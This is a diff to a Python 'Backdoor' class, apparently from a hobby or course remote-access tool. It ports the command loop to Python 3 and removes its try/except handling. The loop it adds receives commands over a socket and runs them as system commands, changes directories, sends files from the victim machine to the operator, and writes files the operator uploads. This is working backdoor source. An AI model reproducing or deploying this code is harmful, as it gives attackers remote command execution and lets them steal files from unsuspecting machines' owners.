@@ -52,34 +52,59 @@ class Backdoor:
             # command = self.connection.recv(2048).decode()
             command = self.receive_json()
 
-            try:
-                #exit program
-                if(command[0].lower() == "exit"):
-                    self.connection.close()
-                    exit()
+            # try:
+            #     #exit program
+            #     if(command[0].lower() == "exit"):
+            #         self.connection.close()
+            #         exit()
+            #
+            #     #change directory
+            #     elif(command[0] == "cd" and (len(command) > 1) ):
+            #         command_result = self.change_directory(command[1])
+            #
+            #     #download file
+            #     elif(command[0].lower() == "download"):
+            #         command_result = self.read_file(command[1])
+            #
+            #     #upload file
+            #     elif(command[0].lower() == "upload"):
+            #         command_result = self.write_file(command[1], command[2] )
+            #
+            #     else:
+            #         command_result = self.execute_sys_command(command)
+            #         # self.connection.send(command_result)
+            # except Exception:
+            #     command_result = "[-] Error during command execution. "
+            #
+            # try:
+            #     self.send_json(command_result)
+            # except Exception:
+            #     self.send_json("Error sending data through JSON")
 
-                #change directory
-                elif(command[0] == "cd" and (len(command) > 1) ):
-                    command_result = self.change_directory(command[1])
+################################## CONVERTING TO PYTHON 3 ###########################
+            #exit program
+            if(command[0].lower() == "exit"):
+                self.connection.close()
+                exit()
 
-                #download file
-                elif(command[0].lower() == "download"):
-                    command_result = self.read_file(command[1])
+            #change directory
+            elif(command[0] == "cd" and (len(command) > 1) ):
+                command_result = self.change_directory(command[1])
 
-                #upload file
-                elif(command[0].lower() == "upload"):
-                    command_result = self.write_file(command[1], command[2] )
+            #download file
+            elif(command[0].lower() == "download"):
+                command_result = self.read_file(command[1])
 
-                else:
-                    command_result = self.execute_sys_command(command)
-                    # self.connection.send(command_result)
-            except Exception:
-                command_result = "[-] Error during command execution. "
+            #upload file
+            elif(command[0].lower() == "upload"):
+                command_result = self.write_file(command[1], command[2] )
 
-            try:
-                self.send_json(command_result)
-            except Exception:
-                self.send_json("Error sending data through JSON")
+            else:
+                command_result = self.execute_sys_command(command)
+                # self.connection.send(command_result)
+
+            self.send_json(command_result)
+########################################################################################
 
         self.connection.close()
 
